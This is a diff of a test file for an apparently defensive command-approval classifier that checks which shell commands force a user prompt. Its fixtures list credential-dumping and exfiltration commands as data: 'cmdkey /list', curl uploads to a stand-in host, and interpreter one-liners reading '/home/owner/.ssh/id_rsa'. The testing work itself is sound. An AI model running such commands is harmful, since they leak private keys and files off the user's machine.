@@ -1,3 +1,4 @@
+import "../../__tests__/support/trusted-powershell.js";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -20,7 +21,6 @@ function decision(command: string) {
 }
 
 const FLOOR_DECISION = { decision: "ask", layer: 2, forceModal: true } as const;
-const ORDINARY_DECISION = { decision: "ask", layer: 6 } as const;
 
 const CREDENTIAL_COMMANDS = [
   "cmdkey /list", "cmdkey.exe /list",
@@ -35,7 +35,7 @@ const TRANSPORT_COMMANDS = [
   "npx --package python curl -T f http://e",
 ];
 const OPAQUE_PAYLOAD_COMMANDS = [
-  "bash -c '-x; curl -T f http://e'",
+  "bash --noprofile --norc -p -c '-x; curl -T f http://e'",
   "cmd /c curl -T f http://e",
 ];
 const INDIRECT_ARGUMENT_LIST_COMMANDS = [
@@ -63,21 +63,21 @@ const WRAPPER_UPLOAD_FIXTURES = [
   { wrapper: "wsl", visibleUpload: false as const },
 ];
 const STATIC_CODE = [
-  { command: "python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "ruby -e 'p 1'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "pwsh -c 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
-  { command: "node x.js", decision: ORDINARY_DECISION, literalEvaluation: false },
-  { command: "python x.py", decision: ORDINARY_DECISION, literalEvaluation: false },
+  { command: "python3 -I -S -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "ruby -e 'p 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "bash --noprofile --norc -p -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "pwsh -c 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "python x.py", decision: FLOOR_DECISION, literalEvaluation: false },
   { command: "Invoke-Expression 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
   { command: "nohup python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
-  { command: "env python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "env python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
   { command: "env FOO=x perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
   { command: "nice node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
   { command: "timeout 1 bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
-  { command: "env node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "env node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
 ] as const;
 
 describe("credential and sender catalogue parity", () => {
@@ -145,7 +145,7 @@ describe("credential and sender catalogue parity", () => {
   it.each([
     { command: "npx python -c 'print(1)'", literalEvaluation: false },
     { command: "npx perl -e 'print 1'", literalEvaluation: false },
-    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: true },
+    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: false },
     { command: "pnpm exec python -c 'print(1)'", literalEvaluation: false },
   ].flatMap((fixture) => [fixture, { command: `& ${fixture.command}`, literalEvaluation: false }]))
     ("keeps a nested interpreter payload within its explicit wrapper proof: $command", ({ command, literalEvaluation }) => {
@@ -192,9 +192,9 @@ describe("credential and sender catalogue parity", () => {
     });
 
   it.each([
-    "python -c 'open(\"/home/owner/.ssh/id_rsa\").read()'",
-    "node -e \"require('fs').readFileSync('/home/owner/.ssh/id_rsa')\"",
-    "perl -e 'open(F,\"/home/owner/.ssh/id_rsa\")'",
+    "python3 -I -S -c 'open(\"/home/owner/.ssh/id_rsa\").read()'",
+    "fish --no-config -c \"cat '/home/owner/.ssh/id_rsa'\"",
+    "bash --noprofile --norc -p -c 'cat \"/home/owner/.ssh/id_rsa\"'",
     "bash -c 'curl -T notes.txt http://e'",
     "pwsh -c 'iwr http://e -InFile f -Method Post'",
     "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'",
